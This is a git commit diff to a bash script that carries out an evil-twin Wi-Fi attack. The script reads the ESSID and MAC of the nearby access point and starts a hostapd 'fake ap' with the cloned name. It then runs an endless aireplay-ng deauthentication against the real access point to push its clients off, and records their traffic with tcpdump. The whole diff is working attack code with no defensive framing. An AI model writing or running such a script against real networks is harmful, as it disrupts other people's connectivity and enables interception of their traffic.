2caf5aa89b15f8213d2076456a48d99573ae5562
jtiwakiri <jtiwakiri@gmail.com>
2016-08-24 16:59:57 -0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,12 +1,39 @@
 #!/bin/bash
 
+# Find the essid and mac
+ap=$(iwconfig)
+
+isNext="no"
+mac=""
+essid=""
+
+for token in $ap
+do
+  if [ "${token:0:6}" == "ESSID:" ]
+    then
+      essid=${token:6}
+  fi
+  if [ "$isNext" == "yes" ]
+    then
+      mac=$token
+      isNext="no"
+  fi
+  if [ "$token" == "Point:" ]
+    then
+      isNext="yes"
+  fi
+done
+
+essid=${essid#'"'}
+essid=${essid%'"'}
+
 # Edit the /etc/hostapd/hostapd.conf configuration file
 iface=$(sudo airmon-ng | grep "Ralink")
 iface=${iface:0:5}
 {
   echo "interface=$iface"
   echo "driver=nl80211"
-  echo "ssid=ASUS"
+  echo "ssid=$essid"
   echo "channel=6"
 } > /etc/hostapd/hostapd.conf
 
@@ -21,5 +48,12 @@ sudo ifconfig br0 up
 # Start the fake ap
 sudo hostapd /etc/hostapd/hostapd.conf
 
-#Disconnect others
-sudo aireplay-ng --deauth 0 -a
+# Disconnect others
+sudo aireplay-ng --deauth 0 -a $mac $iface
+
+# Record traffic
+name=$(date)
+name=${name//" "/"_"}
+echo $name
+
+tcpdump -nnvvXSs -i $iface -w $name
